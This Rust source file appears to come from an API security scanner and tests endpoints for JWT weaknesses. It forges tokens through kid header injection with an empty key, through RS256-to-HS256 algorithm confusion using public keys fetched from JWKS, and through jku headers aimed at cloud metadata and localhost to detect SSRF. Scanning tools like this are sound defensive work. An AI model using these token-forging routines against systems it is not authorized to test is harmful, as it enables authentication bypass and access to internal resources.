use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine;
use jsonwebtoken::{Algorithm, EncodingKey, Header};
use nevelio_core::types::{Endpoint, Finding, Severity};
use nevelio_core::HttpClient;
use std::time::Instant;

// ---------------------------------------------------------------------------
// Check: JWT kid header injection
// ---------------------------------------------------------------------------

pub(super) async fn check_jwt_kid_injection(
    client: &HttpClient,
    ep: &Endpoint,
    token: &str,
    kid_payloads: &[String],
) -> Vec<Finding> {
    for kid in kid_payloads {
        // Try with empty secret (path traversal to /dev/null → empty HMAC key)
        let Some(forged) = super::jwt_helpers::forge_jwt_with_kid(token, kid, b"") else {
            continue;
        };

        let Ok(req) = client
            .inner()
            .request(
                ep.method.parse().unwrap_or(reqwest::Method::GET),
                &ep.full_url,
            )
            .header("Authorization", format!("Bearer {}", forged))
            .build()
        else {
            continue;
        };

        let Ok(resp) = client.send(req).await else {
            continue;
        };

        if resp.status().is_success() {
            let mut f = Finding::new(
                "JWT kid Injection".to_string(),
                Severity::Critical,
                9.1,
                "auth".to_string(),
                ep.full_url.clone(),
                ep.method.clone(),
            );
            f.description = format!(
                "Le header JWT `kid` est utilisé sans validation. En injectant {:?}, \
                 le serveur a accepté un token signé avec une clé vide ou une clé injectée. \
                 Un attaquant peut forger des tokens valides pour n'importe quel utilisateur.",
                kid
            );
            f.proof = format!(
                "JWT avec kid={:?} signé avec secret vide → HTTP {} (attendu 401)",
                kid,
                resp.status().as_u16()
            );
            f.recommendation =
                "Valider la valeur du header `kid` contre une allowlist de key IDs connus. \
                 Ne jamais utiliser `kid` pour construire un chemin de fichier ou une requête SQL."
                    .to_string();
            f.cwe = Some("CWE-89".to_string());
            f.references = vec![
                "https://portswigger.net/web-security/jwt/algorithm-confusion".to_string(),
                "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"
                    .to_string(),
            ];
            return vec![f];
        }
    }
    vec![]
}

// ---------------------------------------------------------------------------
// Check: JWT algorithm confusion (RS256 → HS256 using public key as secret)
// ---------------------------------------------------------------------------

pub(super) async fn check_jwt_algo_confusion(
    client: &HttpClient,
    base_target: &str,
    token: &str,
    jwks_paths: &[String],
) -> Vec<Finding> {
    // Only applicable when the original JWT uses an asymmetric algorithm
    let parts: Vec<&str> = token.splitn(3, '.').collect();
    if parts.len() != 3 {
        return vec![];
    }
    let Ok(header_bytes) = URL_SAFE_NO_PAD.decode(parts[0]) else {
        return vec![];
    };
    let Ok(header_json) = serde_json::from_slice::<serde_json::Value>(&header_bytes) else {
        return vec![];
    };
    let original_alg = header_json
        .get("alg")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    if !matches!(
        original_alg,
        "RS256" | "RS384" | "RS512" | "ES256" | "ES384" | "ES512"
    ) {
        return vec![];
    }

    let base = base_target.trim_end_matches('/');

    // Try to retrieve the public key from JWKS endpoints
    for path in jwks_paths {
        let url = format!("{}{}", base, path);
        let Ok(req) = client.inner().get(&url).build() else {
            continue;
        };
        let Ok(resp) = client.send(req).await else {
            continue;
        };
        if !resp.status().is_success() {
            continue;
        }
        let Ok(body) = resp.text().await else {
            continue;
        };
        let Ok(jwks) = serde_json::from_str::<serde_json::Value>(&body) else {
            continue;
        };

        // Extract first key's n (RSA modulus) or x value (EC key)
        let keys = jwks.get("keys").and_then(|k| k.as_array());
        let Some(keys) = keys else {
            continue;
        };
        if keys.is_empty() {
            continue;
        }

        let first_key = &keys[0];
        let key_material = first_key
            .get("n")
            .or_else(|| first_key.get("x"))
            .and_then(|v| v.as_str());
        let Some(raw_key) = key_material else {
            continue;
        };

        // Use the raw base64url key material as HMAC secret (the confusion attack vector)
        let Ok(secret_bytes) = URL_SAFE_NO_PAD.decode(raw_key) else {
            continue;
        };

        // Forge a HS256 token using the public key bytes as HMAC secret
        let Some(claims) = super::jwt_helpers::decode_jwt_claims(token) else {
            continue;
        };
        let mut new_header = Header::new(Algorithm::HS256);
        new_header.typ = Some("JWT".to_string());
        let Ok(forged) = jsonwebtoken::encode(
            &new_header,
            &claims,
            &EncodingKey::from_secret(&secret_bytes),
        ) else {
            continue;
        };

        // Test on the first available endpoint (we don't have ep here, use base_target)
        let test_url = format!("{}/", base);
        let Ok(req) = client
            .inner()
            .get(&test_url)
            .header("Authorization", format!("Bearer {}", forged))
            .build()
        else {
            continue;
        };

        let Ok(resp) = client.send(req).await else {
            continue;
        };

        if resp.status().is_success() {
            let mut f = Finding::new(
                "JWT Algorithm Confusion (RS256 → HS256)".to_string(),
                Severity::Critical,
                9.8,
                "auth".to_string(),
                test_url,
                "GET".to_string(),
            );
            f.description = format!(
                "Le serveur utilise {} mais accepte un token HS256 signé avec la clé publique \
                 RSA comme secret HMAC. Un attaquant peut forger des tokens valides pour \
                 n'importe quel utilisateur sans connaître la clé privée.",
                original_alg
            );
            f.proof = format!(
                "JWKS trouvé à {} — clé publique utilisée comme secret HS256 → HTTP {} accepté",
                url,
                resp.status().as_u16()
            );
            f.recommendation =
                "Utiliser un algorithme fixe côté serveur, ne jamais accepter l'algorithme \
                 indiqué dans le header JWT. Utiliser des librairies qui vérifient l'alg attendu \
                 (RS256 ne peut pas être downgraded vers HS256)."
                    .to_string();
            f.cwe = Some("CWE-327".to_string());
            f.references = vec![
                "https://portswigger.net/web-security/jwt/algorithm-confusion".to_string(),
                "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"
                    .to_string(),
            ];
            return vec![f];
        }
    }

    vec![]
}

// ---------------------------------------------------------------------------
// Check: JWT jku/x5u SSRF (timing-based detection)
// ---------------------------------------------------------------------------

const JKU_SSRF_TARGETS: &[&str] = &[
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:80/",
];

pub(super) async fn check_jwt_jku_ssrf(
    client: &HttpClient,
    ep: &Endpoint,
    token: &str,
) -> Vec<Finding> {
    let parts: Vec<&str> = token.splitn(3, '.').collect();
    if parts.len() != 3 {
        return vec![];
    }

    let Ok(payload_bytes) = URL_SAFE_NO_PAD.decode(parts[1]) else {
        return vec![];
    };
    let Ok(claims) = serde_json::from_slice::<serde_json::Value>(&payload_bytes) else {
        return vec![];
    };

    // Baseline response time (no jku)
    let baseline_start = Instant::now();
    if let Ok(req) = client
        .inner()
        .request(
            ep.method.parse().unwrap_or(reqwest::Method::GET),
            &ep.full_url,
        )
        .header("Authorization", format!("Bearer {}", token))
        .build()
    {
        let _ = client.send(req).await;
    }
    let baseline_ms = baseline_start.elapsed().as_millis();

    for jku_target in JKU_SSRF_TARGETS {
        // Forge JWT with jku header pointing to an internal URL
        let jku_header = serde_json::json!({"alg": "HS256", "typ": "JWT", "jku": jku_target});
        let header_b64 = URL_SAFE_NO_PAD.encode(jku_header.to_string().as_bytes());
        let payload_b64 = parts[1];
        let msg = format!("{}.{}", header_b64, payload_b64);
        // Sign with empty secret — the server will try to fetch jku to get the real key
        let sig = URL_SAFE_NO_PAD.encode(b"forgedsignature");
        let jku_token = format!("{}.{}", msg, sig);

        let start = Instant::now();
        let Ok(req) = client
            .inner()
            .request(
                ep.method.parse().unwrap_or(reqwest::Method::GET),
                &ep.full_url,
            )
            .header("Authorization", format!("Bearer {}", jku_token))
            .build()
        else {
            continue;
        };
        let Ok(resp) = client.send(req).await else {
            continue;
        };
        let elapsed_ms = start.elapsed().as_millis();

        let status = resp.status().as_u16();
        let body = resp.text().await.unwrap_or_default();
        let body_lower = body.to_lowercase();

        // SSRF indicators: either the body contains metadata from the internal URL
        // or the response leaks the jku URL in an error message
        let has_ssrf_content = ["ami-id", "instance-id", "169.254", "local-ipv4"]
            .iter()
            .any(|i| body_lower.contains(i));
        let reflects_jku = body.contains(*jku_target);
        // Timing heuristic: if jku fetch adds >1500ms extra latency, SSRF is probable
        let timing_anomaly = elapsed_ms > baseline_ms + 1500;

        let _ = (status, claims.clone()); // avoid unused warnings

        if has_ssrf_content || reflects_jku || timing_anomaly {
            let confidence = if has_ssrf_content || reflects_jku {
                "Confirmé"
            } else {
                "Probable (timing)"
            };
            let mut f = Finding::new(
                "JWT jku SSRF — header jku pointant vers ressource interne".to_string(),
                Severity::High,
                7.5,
                "auth".to_string(),
                ep.full_url.clone(),
                ep.method.clone(),
            );
            f.description = format!(
                "Le serveur semble traiter le header JWT `jku` ({:?}) en effectuant une requête \
                 vers l'URL fournie. Un attaquant peut pointer `jku` vers son propre serveur \
                 pour héberger une JWKS forgée et s'authentifier comme n'importe quel utilisateur.",
                jku_target
            );
            f.proof = format!(
                "{} — jku={:?}, délai {}ms vs baseline {}ms",
                confidence, jku_target, elapsed_ms, baseline_ms
            );
            f.recommendation =
                "Ignorer ou valider strictement le header `jku`/`x5u` des JWTs entrants. \
                 Utiliser uniquement des clés de validation configurées côté serveur, \
                 sans jamais fetcher de clés depuis des URLs dynamiques."
                    .to_string();
            f.cwe = Some("CWE-918".to_string());
            f.references =
                vec!["https://portswigger.net/web-security/jwt/algorithm-confusion".to_string()];
            return vec![f];
        }
    }

    vec![]
}
